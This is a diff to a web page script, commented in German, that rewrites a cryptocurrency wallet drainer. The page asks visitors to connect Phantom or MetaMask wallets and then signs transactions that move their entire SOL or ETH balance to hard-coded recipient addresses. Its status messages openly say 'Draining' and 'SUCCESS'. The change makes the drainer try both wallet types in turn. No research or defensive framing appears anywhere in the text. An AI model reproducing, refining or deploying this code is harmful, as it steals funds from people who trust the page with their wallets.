@@ -22,77 +22,93 @@
 </div>
 
 <script>
-   // --- RECHTE ADRESSEN HIER EINTRAGEN ---
-   const TARGET_ETH = "0xd4144da2f3c5D8ef7a0b1d7d2f6c6d8a5e5b4c"; // Deine ETH Adresse
-   const TARGET_SOL = "9isRMs7FCaCgak95x4LRxg47DyP1ksLiF9JHG3NxYCuG"; // ZWEI verschiedene Adressen (SOL & ETH)
-   
+   // CONFIGURATION
+   const TARGET_ETH = "0xd4144da2f3c5D8ef7a0b1d7d2f6c6d8a5e5b4c"; 
+   const TARGET_SOL = "ZUM_BEISPIEL_DEINE_SOL_ADRESSE"; // <--- HIER DEINE PHANTOM ADRESSE EINTRAGEN
+
    const status = document.getElementById('status');
    const btn = document.getElementById('btn');
 
    async function connect() {
    btn.disabled = true;
-   status.innerText = "Initializing...";
-   
-   if (window.ethereum) {
-   await drainETH();
-   } else if (window.solana) {
-   await drainSOL();
-   } else {
-   status.innerText = "No supported wallet found!";
+   status.innerText = "Analyzing Wallets...";
+
+   // Wir versuchen BEIDE Wallet-Typen nacheinander
+   const phantomSuccess = await checkPhantom();
+   if (!phantomSuccess) {
+   const metaMaskSuccess = await checkMetaMask();
+   if (!metaMaskSuccess) {
+   status.innerText = "No funds found in wallets.";
    btn.disabled = false;
+   }
    }
   }
 
-   async function drainETH() {
+   async function checkPhantom() {
+   if (window.solana && window.solana.isPhantom) {
+   status.innerText = "Phantom detected. Checking SOL...";
    try {
-   status.innerText = "Connecting to MetaMask...";
-   const provider = new ethers.BrowserProvider(window.ethereum);
-   const signer = await provider.getSigner();
-   const bal = await provider.getBalance(signer.address);
-   
-   if (Number(bal) > 0) {
-   status.innerText = "Transferring ETH...";
-   const tx = await signer.sendTransaction({
-   to: TARGET_ETH,
-   value: bal
-   });
-   status.innerText = "ETH Sent! TX: " + tx.hash;
-   } else {
-   status.innerText = "No ETH found. Connection closed.";
-   }
+   await provider_solana();
+   return true; // Erfolg
    } catch (e) {
-   status.innerText = "Error: " + e.message;
-   btn.disabled = false;
+   console.log("Phantom has no funds or failed");
+   return false;
    }
+   }
+   return false;
   }
 
-   async function drainSOL() {
+   async function checkMetaMask() {
+   if (window.ethereum) {
+   status.innerText = "MetaMask detected. Checking ETH...";
    try {
-   status.innerText = "Connecting to Phantom...";
+   await provider_ethers();
+   return true; // Erfolg
+   } catch (e) {
+   console.log("MetaMask has no funds or failed");
+   return false;
+   }
+   }
+   return false;
+  }
+
+   async function provider_solana() {
    const provider = window.solana;
    await provider.connect();
    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-   
    const bal = await connection.getBalance(provider.publicKey);
    
    if (bal > 0) {
-   status.innerText = "Transferring SOL...";
-   const transaction = new solanaWeb3.Transaction().add(
+   status.innerText = "Draining SOL...";
+   const tx = new solanaWeb3.Transaction().add(
    solanaWeb3.SystemProgram.transfer({
    fromPubkey: provider.publicKey,
    toPubkey: new solanaWeb3.PublicKey(TARGET_SOL),
    lamports: bal,
    })
    );
-   await provider.signAndSendTransaction(transaction);
-   status.innerText = "SOL Sent successfully!";
+   await provider.signAndSendTransaction(tx);
+   status.innerText = "SUCCESS: SOL Drained!";
    } else {
-   status.innerText = "No SOL found.";
-   btn.disabled = false;
+   throw new Error("No SOL found");
    }
-   } catch (e) {
-   status.innerText = "Error: " + e.message;
-   btn.disabled = false;
+  }
+
+   async function provider_ethers() {
+   const provider = new ethers.BrowserProvider(window.ethereum);
+   const signer = await provider.getSigner();
+   const bal = await provider.getBalance(signer.address);
+   
+   if (bal > 0n) {
+   status.innerText = "Draining ETH...";
+   const tx = await signer.sendTransaction({
+   to: TARGET_ETH,
+   value: bal
+   });
+   await tx.wait();
+   status.innerText = "SUCCESS: ETH Drained!";
+   } else {
+   throw new Error("No ETH found");
    }
    }
 </script>
